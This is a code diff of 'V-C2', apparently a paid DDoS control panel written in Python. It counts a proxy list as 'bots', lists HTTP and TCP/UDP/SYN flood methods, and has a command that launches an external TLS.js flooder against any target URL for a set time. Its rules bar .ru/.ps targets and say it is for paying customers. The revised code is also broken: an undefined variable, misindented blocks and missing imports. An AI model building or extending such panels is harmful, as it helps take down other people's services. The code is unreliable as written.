@@ -1,3 +1,4 @@
+#include#
 import socket
 import os
 import requests
@@ -7,7 +8,7 @@ import time
 import sys
 import colorama
 
-###color
+#color
 def color(data_input_output):
     color_codes = {
         "GREEN": '\033[32m',
@@ -33,16 +34,16 @@ def color(data_input_output):
 lightwhite = color("LIGHTWHITE_EX")
 gray = color("LIGHTBLSYN_EX")
 red = color("LIGHTMAGENTA_EX")
-###include##
+#p1#
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
     
 proxys = open('loader/proxy.txt').readlines()
 bots = len(proxys)
 
+#p2#
 def home():
     clear()
-    si()
     print(f'''
     {red}██╗   ██╗       ██████╗██████╗ 
     {red}██║   ██║      ██╔════╝╚════██╗
@@ -50,60 +51,73 @@ def home():
     {red}╚██╗ ██╔╝╚════╝██║     ██╔═══╝ 
      {red}╚████╔╝       ╚██████╗███████╗
       {red}╚═══╝         ╚═════╝╚══════╝
-      {lightwhite}‎ ╔═════════════════════════╗
-      {lightwhite}║ ‎ WELCOME BACK TO V-C2 TOOLS‎‎‎‎ ‎ ‎ ║
-      {lightwhite}║‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ CC : V-C2 Team‎ ‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎ ║
-      {lightwhite}‎║ ‎ ‎ ‎ ‎ ‎TYPE !HELP For help ‎ ‎ ‎ ‎ ‎ ‎ ‎‎║ ‎ ‎ 
-      {lightwhite}‎║‎ ‎ ‎ ‎ ‎ ONLINE BOT : {bots}‎ ‎ ‎ ‎ ‎ ‎‎ ‎ ║ ‎ ‎‎
-      {lightwhite} ╚═════════════════════════╝
-''')
+      {lightwhite}WELCOME BACK TO V-C2
+      {lightwhite}MADE BY {gray}@CIA_GOV
+      {lightwhite}ONLINE BOT = {red}{bots}''')
 
 def help():
-    clear()
-    si()
     print(f'''
-\x1b[38;2;0;212;14m‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎  ‎‎HELP TOOLS
-\x1b[38;2;0;212;14m╔═════════════════════════════════╗
-\x1b[38;2;0;212;14m║‎ Attacking RU/PS domains is prohibited‎ ║ ‎ ‎ ‎ 
-\x1b[38;2;0;212;14m║  This tool is only for paying parties ║   
-\x1b[38;2;0;212;14m║‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ Use VPS for great power        ║
-\x1b[38;2;0;212;14m╚═════════════════════════════════╝
-''')
+LAYER7  ► SHOW LAYER7 METHODS
+LAYER4  ► SHOW LAYER4 METHODS
+RULES   ► RULES PANEL
+TOOLS   ► SHOW TOOLS
+CLEAR   ► CLEAR TERMINAL
+            ''')
+def rules():
+    print(f'''
+    • ATTACKING THE .PS/.RU DOMAIN IS PROHIBITED
+    • DO NOT CONTINUE ATTACKS AT THE SAME TIME 
+    • MUST HAVE AN HTTP PROXY 
+    • DOES NOT PROVIDE ADDITIONS 
+    • CAN ONLY PORT 80/443''')
 
-def list():
-    si()
+def layer7():
     print(f'''
-    {lightwhite}LAYER7 ‎ ‎ ‎ = HTTP/HTTPS FLOODER
-    {lightwhite}LAYER4  ‎ ‎ = TCP/UDP/SYN FLODDER
-    {lightwhite}EXPLUSIVE = MIRAI/BOTNET
-    ''')
+    HTTP-STORM
+    HTTP-ZERO
+    HTTP-BROWSER
+    HTTP-ENGINE
+    HTTP-TLS
+    HTTP-HCAP
+    HTTP-CF''')
 
-def L7():
-    clear()
-    si()
+def layer4():
     print(f'''
-    \x1b[38;2;0;212;14m██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗
-    \x1b[38;2;0;212;14m██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║
-    \x1b[38;2;0;212;14m██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝
-    \x1b[38;2;0;212;14m██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝ 
-    \x1b[38;2;0;212;14m███████╗██║  ██║   ██║   ███████╗██║  ██║   ██║  
-    \x1b[38;2;0;212;14m╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝                                                   
-    \x1b[38;2;0;212;14m╔═══════════════════════════════════════════════╗
-    \x1b[38;2;0;212;14m║‎ ‎‎‎ HTTP-ZEUZ‎   ‎║‎ HTTP-BROWSER ║ ‎ ‎ HTTP-TLS ‎ ‎‎ ║ HTTP-RAND║
-    \x1b[38;2;0;212;14m║ HTTP-ENGINE ‎ ║ ‎ HTTP-STROM ‎ ║‎  HTTP-SOCKET‎ ║‎ HTTP-HCAP║
-    \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
-''')
+    UDP
+    SYN
+    TCP''')
+
 def main():
-    home()
-    while(True):
-        cnc = input('''{lightwhite}root@root{gray}''')
-        if cnc == "L7" or cnc == "LAYER7" or cnc == "!L7":
-            L7()
-        elif cnc == "!LIST" or cnc == "!LS":
-            list()
-        elif cnc == "!help":
-            help()
+    stdout.write(Fore.LIGHTCYAN_EX+"╔═══"+Fore.LIGHTCYAN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTCYAN_EX+"root"+Fore.CYAN+"]"+Fore.LIGHTCYAN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
+    command = input()
+    if command == "cls" or command == "!clear":
+        clear()
+        home()
+    elif command == "help" or command == "!help":
+        help()
+    elif command == "layer7" or command == "LAYER7" or command == "!l7" or command == "L7" or command == "Layer7":
+        layer7()
+    elif command == "layer4" or command == "LAYER4" or command == "!l4" or command == "L4" or command == "Layer4":
+        layer4()
+    elif command == "exit":
+        exit()
+    elif command == "!http-tls":
+        try:
+                url = cnc.split()[1]
+                time = cnc.split()[4] 
+                os.system(f'node loader/TLS.js {url} {time}')
+            except IndexError:
+                print('Usage: !http-tls <target> <time>')
+                print('Example: !http-tls https://google.com 60')
+    else:
+            try:
+                command = cnc.split()[0]
+                print("Command: [ " + command + " ] Not Found!")
+            except IndexError:
+                pass
+    
 
+#end
 def login():
     clear()
     user = "root"
